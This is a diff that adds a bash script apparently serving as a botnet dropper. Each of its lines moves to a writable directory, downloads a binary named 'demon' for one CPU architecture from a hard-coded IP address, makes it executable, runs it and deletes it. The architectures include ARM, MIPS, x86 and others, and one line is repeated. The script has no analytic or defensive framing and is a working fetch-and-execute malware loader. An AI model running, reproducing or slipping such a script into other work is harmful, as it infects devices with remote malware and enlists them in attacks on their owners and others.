@@ -1,0 +1,17 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.63.145/demon.arm4tl; chmod +x demon.arm4tl; ./demon.arm4tl; rm -rf demon.arm4tl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.63.145/demon.arm5; chmod +x demon.arm5; ./demon.arm5; rm -rf demon.arm5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.63.145/demon.arm6; chmod +x demon.arm6; ./demon.arm6; rm -rf demon.arm6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.63.145/demon.i486; chmod +x demon.i486; ./demon.i486; rm -rf demon.i486
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.63.145/demon.i686; chmod +x demon.i686; ./demon.i686; rm -rf demon.i686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.63.145/demon.m68k; chmod +x demon.m68k; ./demon.m68k; rm -rf demon.m68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.63.145/demon.mips; chmod +x demon.mips; ./demon.mips; rm -rf demon.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.63.145/demon.mips64; chmod +x demon.mips64; ./demon.mips64; rm -rf demon.mips64
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.63.145/demon.mpsl; chmod +x demon.mpsl; ./demon.mpsl; rm -rf demon.mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.63.145/demon.ppc; chmod +x demon.ppc; ./demon.ppc; rm -rf demon.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.63.145/demon.sparc; chmod +x demon.sparc; ./demon.sparc; rm -rf demon.sparc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.63.145/demon.x86; chmod +x demon.x86; ./demon.x86; rm -rf demon.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.63.145/demon.i586; chmod +x demon.i586; ./demon.i586; rm -rf demon.i586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.63.145/demon.i486; chmod +x demon.i486; ./demon.i486; rm -rf demon.i486
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.63.145/demon.sh4; chmod +x demon.sh4; ./demon.sh4; rm -rf demon.sh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.63.145/demon.arm7; chmod +x demon.arm7; ./demon.arm7; rm -rf demon.arm7
